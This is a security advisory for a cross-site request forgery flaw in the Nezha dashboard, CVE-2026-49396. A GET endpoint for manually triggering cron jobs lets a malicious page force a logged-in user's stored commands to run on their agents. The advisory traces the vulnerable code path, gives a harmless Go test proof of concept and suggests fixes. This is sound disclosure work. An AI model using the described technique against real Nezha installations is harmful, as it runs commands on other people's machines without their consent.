# [H] Nezha has cross-site GET request that can trigger stored cron commands on a victim's agents

## Summary
Severity: High
Advisory: GHSA-8qhj-4f8c-j8qg
CVE: CVE-2026-49396
CWE: CWE-352
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-06-10
Source: https://github.com/advisories/GHSA-8qhj-4f8c-j8qg
Type: github-advisory

## Affected
- Go: `github.com/nezhahq/nezha` — affected >=1.0.0 <2.0.14

## Details
### Summary

The dashboard exposes the cron manual-trigger action as an authenticated `GET /api/v1/cron/:id/manual` endpoint. Dashboard JWTs are sent in the `nz-jwt` cookie and configured with `SameSite=Lax`, which browsers include on top-level cross-site GET navigations. Because this state-changing GET endpoint has no CSRF token, origin validation, or fetch-metadata guard, an attacker can cause a logged-in Nezha user to trigger one of their existing cron tasks by navigating the victim's browser to the manual-trigger URL.

If the targeted cron task sends a command to an online agent, the stored command is dispatched to the agent task stream. The attacker cannot create or modify the cron command through this issue alone, but can force execution of a command that the victim already saved and is authorized to run.

### Details
Source-to-sink chain:

1. The dashboard registers the manual cron trigger as a GET route under the authenticated API group: `auth.GET("/cron/:id/manual", commonHandler(manualTriggerCron))` at `cmd/dashboard/controller/controller.go:131-134`.
2. JWT auth is cookie-enabled: `CookieName: "nz-jwt"`, `SendCookie: true`, `CookieSameSite: http.SameSiteLaxMode`, and `TokenLookup: "header: Authorization, query: token, cookie: nz-jwt"` at `cmd/dashboard/controller/jwt.go:23-46`.
3. The handler parses the route ID, loads the cron object, checks only normal object ownership via `cr.HasPermission(c)`, then calls `singleton.ManualTrigger(cr)` at `cmd/dashboard/controller/cron.go:170-187`.
4. `ManualTrigger` immediately runs `CronTrigger(cr)()` at `service/singleton/crontask.go:249-250`.
5. `CronTrigger` dispatches the stored command to online eligible agents via `s.TaskStream.Send(&pb.Task{Id: cr.ID, Data: cr.Command, Type: model.TaskTypeCommand})` at `service/singleton/crontask.go:289-304` after the owner/server check in `cronCanSendToServer` (`service/singleton/crontask.go:315-317`).
6. Object authorization is user ownership/admin only: `Common.HasPermission` returns true for admins or matching `UserID` at `model/common.go:44-56`. There is no CSRF token, Origin/Referer validation, or Fetch Metadata check on this GET action.

False-positive screening:

- The endpoint is not read-only: the safe proof below observed an in-memory agent stream receiving the command task.
- The route is authenticated, and the unauthenticated negative control failed with `ApiErrorUnauthorized` and dispatched no task.
- `SameSite=Lax` mitigates cross-site POSTs, but this action uses GET; Lax cookies are still sent on top-level cross-site GET navigations, which is why state-changing GET endpoints remain CSRF-sensitive.
- The attacker must know or guess a cron ID owned by the victim. IDs are numeric. The issue does not allow creating or editing a command; it forces execution of an existing stored task.
- The permission check still limits the triggered task to the victim's own task or an admin's task, but CSRF abuses the victim's browser/session to satisfy that check.

### PoC

Safe local proof used a Go test overlay only; no repository files were modified for the proof and no real command was executed. The test creates an in-memory SQLite database, a victim user, a victim-owned server with an in-memory fake task stream, and a victim-owned cron task with command text `touch /tmp/should-not-run`. It then performs two requests:

1. Negative control: cross-site-style GET without the `nz-jwt` cookie. Expected result: response contains `ApiErrorUnauthorized`; zero tasks are dispatched.
2. Positive proof: cross-site-style GET with the victim's `nz-jwt` cookie. Expected result: API response succeeds and exactly one task is dispatched to the fake agent stream with `Id=7`, `Type=model.TaskTypeCommand`, and `Data="touch /tmp/should-not-run"`.

Command run from a clean checkout of the tested tree:

```bash
cat >/tmp/nezha-docs-stub.go <<'EOF'
package docs

var SwaggerInfo = struct {
	Version string
}{Version: "test"}
EOF

cat >/tmp/nezha-cron-csrf-poc-test.go <<'EOF'
package controller

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/patrickmn/go-cache"
	"google.golang.org/grpc/metadata"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"

	"github.com/nezhahq/nezha/model"
	"github.com/nezhahq/nezha/pkg/i18n"
	pb "github.com/nezhahq/nezha/proto"
	"github.com/nezhahq/nezha/service/singleton"
)

type capturedTaskStream struct { tasks []*pb.Task }

func (s *capturedTaskStream) Send(task *pb.Task) error { s.tasks = append(s.tasks, task); return nil }
func (s *capturedTaskStream) Recv() (*pb.TaskResult, error) { return nil, context.Canceled }
func (s *capturedTaskStream) SetHeader(metadata.MD) error { return nil }
func (s *capturedTaskStream) SendHeader(metadata.MD) error { return nil }
func (s *capturedTaskStream) SetTrailer(metadata.MD) {}
func (s *capturedTaskStream) Context() context.Context { return context.Background() }
func (s *capturedTaskStream) SendMsg(any) error { return nil }
func (s *capturedTaskStream) RecvMsg(any) error { return context.Canceled }

func TestCronManualTriggerAcceptsCookieAuthenticatedCrossSiteGET(t *testing.T) {
	gin.SetMode(gin.TestMode)
	db, err := gorm.Open(sqlite.Open("file:cron_csrf_poc?mode=memory&cache=shared"), &gorm.Config{})
	if err != nil { t.Fatal(err) }
	if err := db.AutoMigrate(&model.User{}, &model.Server{}, &model.Cron{}); err != nil { t.Fatal(err) }
	if err := db.Create(&model.User{Common: model.Common{ID: 100}, Username: "victim", Role: model.RoleMember}).Error; err != nil { t.Fatal(err) }
	if err := db.Create(&model.Server{Common: model.Common{ID: 200, UserID: 100}, Name: "victim-agent"}).Error; err != nil { t.Fatal(err) }

	singleton.DB = db
	singleton.Loc = time.UTC
	singleton.Cache = cache.New(time.Minute, time.Minute)
	singleton.Localizer = i18n.NewLocalizer("en_US", "nezha", "translations", i18n.Translations)
	singleton.Conf = &singleton.ConfigClass{Config: &model.Config{ConfigForGuests: model.ConfigForGuests{SiteName: "test"}, JWTSecretKey: "test-secret-for-cron-csrf-poc", JWTTimeout: 1}}
	singleton.ServerShared = singleton.NewServerClass()
	singleton.CronShared = singleton.NewCronClass()
	defer singleton.CronShared.Stop()

	stream := &capturedTaskStream{}
	server, ok := singleton.ServerShared.Get(200)
	if !ok { t.Fatal("server missing from singleton") }
	server.TaskStream = stream

	cronTask := &model.Cron{Common: model.Common{ID: 7, UserID: 100}, Name: "victim cron", TaskType: model.CronTypeCronTask, Command: "touch /tmp/should-not-run", Servers: []uint64{200}, Cover: model.CronCoverIgnoreAll}
	singleton.CronShared.Update(cronTask)

	authMiddleware := initParams()
	if err := authMiddleware.MiddlewareInit(); err != nil { t.Fatal(err) }
	token, _, err := authMiddleware.TokenGenerator(map[string]interface{}{"user_id": "100", "ip": "203.0.113.10"})
	if err != nil { t.Fatal(err) }

	r := gin.New()
	r.Use(func(c *gin.Context) { c.Set(model.CtxKeyRealIPStr, "203.0.113.10"); c.Next() })
	auth := r.Group("", authMiddleware.MiddlewareFunc())
	auth.GET("/api/v1/cron/:id/manual", commonHandler(manualTriggerCron))

	wNoCookie := httptest.NewRecorder()
	reqNoCookie := httptest.NewRequest(http.MethodGet, "/api/v1/cron/7/manual", nil)
	reqNoCookie.Header.Set("Origin", "https://attacker.example")
	reqNoCookie.Header.Set("Sec-Fetch-Site", "cross-site")
	r.ServeHTTP(wNoCookie, reqNoCookie)
	if !strings.Contains(wNoCookie.Body.String(), "ApiErrorUnauthorized") { t.Fatalf("expected unauthenticated control to fail, got status=%d body=%s", wNoCookie.Code, wNoCookie.Body.String()) }
	if len(stream.tasks) != 0 { t.Fatalf("unauthenticated control dispatched %d task(s)", len(stream.tasks)) }

	w := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/api/v1/cron/7/manual", nil)
	req.Header.Set("Origin", "https://attacker.example")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.AddCookie(&http.Cookie{Name: "nz-jwt", Value: token})
	r.ServeHTTP(w, req)

	var resp struct { Success bool `json:"success"`; Error string `json:"error"` }
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil { t.Fatalf("decode response: %v body=%s", err, w.Body.String()) }
	if !resp.Success { t.Fatalf("manual trigger failed: status=%d body=%s", w.Code, w.Body.String()) }
	if len(stream.tasks) != 1 { t.Fatalf("expected one dispatched task, got %d", len(stream.tasks)) }
	dispatched := stream.tasks[0]
	if dispatched.Id != 7 || dispatched.Type != model.TaskTypeCommand || dispatched.Data != "touch /tmp/should-not-run" { t.Fatalf("unexpected dispatched task: id=%d type=%d data=%q", dispatched.Id, dispatched.Type, dispatched.Data) }
}
EOF

cat >/tmp/nezha-overlay-cron-csrf.json <<'EOF'
{
  "Replace": {
    "/path/to/nezha/cmd/dashboard/docs/docs.go": "/tmp/nezha-docs-stub.go",
    "/path/to/nezha/cmd/dashboard/controller/cron_csrf_poc_test.go": "/tmp/nezha-cron-csrf-poc-test.go"
  }
}
EOF
# Replace /path/to/nezha above with the local checkout path, then run:
go test -vet=off -overlay=/tmp/nezha-overlay-cron-csrf.json ./cmd/dashboard/controller -run TestCronManualTriggerAcceptsCookieAuthenticatedCrossSiteGET -count=1 -v
```

Observed output in this environment:

```text
=== RUN   TestCronManualTriggerAcceptsCookieAuthenticatedCrossSiteGET
--- PASS: TestCronManualTriggerAcceptsCookieAuthenticatedCrossSiteGET (0.00s)
PASS
ok  	github.com/nezhahq/nezha/cmd/dashboard/controller	0.019s
```

The `-vet=off` flag was only needed because this checkout lacks the generated `cmd/dashboard/docs` directory and Go vet still tries to `chdir` into the overlay-created package directory. The overlay includes a minimal `docs` package stub so the controller package can compile without generating Swagger files.

Cleanup:

```bash
rm -f /tmp/nezha-docs-stub.go /tmp/nezha-cron-csrf-poc-test.go /tmp/nezha-overlay-cron-csrf.json
```

### Impact

A remote attacker can cause a logged-in dashboard user to trigger an existing cron task by making the user's browser navigate to `/api/v1/cron/<known-id>/manual`. If that cron task dispatches an agent command, the command is sent to the victim's online agent without the victim intentionally clicking the manual trigger in the dashboard.

Security impact is integrity and availability:

- Integrity: forced execution of a stored command on victim-controlled agents.
- Availability: forced execution of disruptive stored tasks, repeated task starts, or repeated notifications/offline failure paths.
- Confidentiality: not directly demonstrated; the PoC does not show data exfiltration.

### Suggested remediation

- Make manual cron triggering a non-idempotent method such as `POST /api/v1/cron/:id/manual` instead of GET.
- Require a CSRF token for cookie-authenticated state-changing requests, or reject unsafe cross-site requests with `Origin`/`Referer` and Fetch Metadata validation.
- Consider not accepting JWTs from cookies for state-changing API calls unless a CSRF token is present.
- Add a regression test that sends a cross-site-style GET with a valid cookie and asserts no cron task is dispatched.
- If frontend compatibility requires cookies, keep `SameSite=Lax` or stricter, but do not rely on it to protect state-changing GET routes.

## References
- https://github.com/nezhahq/nezha/security/advisories/GHSA-8qhj-4f8c-j8qg
- https://nvd.nist.gov/vuln/detail/CVE-2026-49396
- https://github.com/nezhahq/nezha
